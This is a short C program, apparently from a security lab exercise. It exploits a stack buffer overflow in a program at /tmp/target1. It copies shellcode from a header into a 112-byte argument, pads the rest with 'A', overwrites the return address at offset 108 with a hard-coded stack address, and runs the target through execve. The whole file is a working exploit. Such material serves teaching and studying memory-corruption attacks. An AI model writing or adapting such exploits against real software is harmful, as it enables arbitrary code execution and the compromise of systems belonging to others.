#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
	char arg1[112];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	int target = 0xbefffce8;
	memset(arg1, 'A', 108);
	memcpy(arg1, shellcode, strlen(shellcode));
	*((int*) (arg1+108)) = target;
	
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
